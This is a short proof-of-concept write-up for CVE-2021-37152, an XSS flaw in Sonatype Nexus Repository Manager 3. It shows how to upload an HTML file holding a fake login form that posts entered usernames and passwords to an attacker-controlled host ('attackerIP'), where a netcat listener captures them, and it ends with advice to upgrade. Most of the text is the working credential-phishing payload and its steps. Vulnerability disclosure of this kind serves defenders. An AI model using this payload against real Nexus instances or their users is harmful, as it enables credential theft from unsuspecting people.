# CVE-2021-37152
## Multiple XSS issues exist in Sonatype Nexus Repository Manager 3 before 3.33.0. An authenticated attacker with the ability to add HTML files to a repository could redirect users to Nexus Repository Manager’s pages with code modifications. Sonatype have resolved the issue by adding a repository configuration option to force downloading HTML files instead of rendering them in browser.

In our example, we can use XSS to trick the person accessing the link to the file, to enter login credentials which will be directed back to us. Uploaded xss.html file contains the code below.


We can upload it here 
https://example.com/nexus/#browse/upload:example-repository

```html
<h3>Please login to proceed</h3> <form action=http://attackerIP>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br> 
```

![image](https://user-images.githubusercontent.com/80063008/136326654-9509405d-c111-45cd-953e-93e177bfe2a5.png)

We can then access the file on the link 
https://example.com/nexus/repository/example-repository/1/test/test/test-test.html 

![image](https://user-images.githubusercontent.com/80063008/136326800-004365ce-7c38-415f-8741-5e44fa86d4b0.png)

While having a netcat listener up, we can see the inputted username and password.

![image](https://user-images.githubusercontent.com/80063008/136326977-ca23fb78-7874-4ce5-9143-ee17a710dbf9.png)


### Recommended solution:

Update Nexus 3 to the latest version.
